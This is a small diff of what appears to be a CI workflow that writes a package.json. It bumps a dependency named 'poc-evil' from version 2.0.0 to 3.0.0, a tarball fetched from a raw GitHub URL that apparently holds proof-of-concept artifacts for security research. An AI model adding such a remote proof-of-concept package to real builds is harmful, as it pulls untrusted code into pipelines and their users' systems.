@@ -17,7 +17,7 @@ jobs:
             "version": "1.0.0",
             "private": true,
             "dependencies": {
-              "poc-evil": "https://raw.githubusercontent.com/PDFtoMark/gab-poc-wfr-artifact/main/poc-evil-2.0.0.tgz"
+              "poc-evil": "https://raw.githubusercontent.com/PDFtoMark/gab-poc-wfr-artifact/main/poc-evil-3.0.0.tgz"
             }
           }
           JSON
